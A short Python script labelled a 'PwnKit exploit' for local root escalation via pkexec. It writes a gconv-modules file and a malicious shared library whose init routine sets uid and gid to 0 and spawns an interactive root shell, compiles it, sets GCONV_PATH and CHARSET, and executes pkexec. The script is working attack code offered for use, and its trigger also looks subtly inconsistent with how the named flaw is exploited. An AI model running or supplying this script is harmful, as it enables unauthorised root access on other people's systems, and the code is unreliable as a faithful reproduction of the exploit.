#!/usr/bin/env python3
import os, sys, subprocess

def compile_so():
    tmpdir = "/tmp/pwn"
    os.makedirs(tmpdir, exist_ok=True)

    # gconv modules file
    with open(f"{tmpdir}/gconv-modules", "w") as f:
        f.write("module  UTF-8//  INTERNAL  id  1\n")

    # C source for the malicious shared library
    c_code = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv(void) {}
void gconv_init(void *step) {
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    char *args[] = { "/bin/sh", "-i", NULL };
    execve("/bin/sh", args, NULL);
    _exit(0);
}
"""
    with open(f"{tmpdir}/id.c", "w") as f:
        f.write(c_code)

    # compile
    print("[*] Compiling...")
    ret = subprocess.run(
        ["gcc", "-shared", "-o", f"{tmpdir}/id.so", f"{tmpdir}/id.c", "-nostartfiles", "-fPIC"],
        capture_output=True, text=True
    )
    if ret.returncode != 0:
        print("[-] gcc failed:", ret.stderr)
        sys.exit(1)
    return tmpdir

def exploit(workdir):
    os.environ["GCONV_PATH"] = workdir
    os.environ["CHARSET"] = "id"
    os.execlp("/usr/bin/pkexec", "pkexec", "")

if __name__ == "__main__":
    print("[*] PwnKit exploit")
    if os.geteuid() == 0:
        print("[+] Already root")
        os.execvp("/bin/sh", ["/bin/sh", "-i"])
    else:
        workdir = compile_so()
        exploit(workdir)
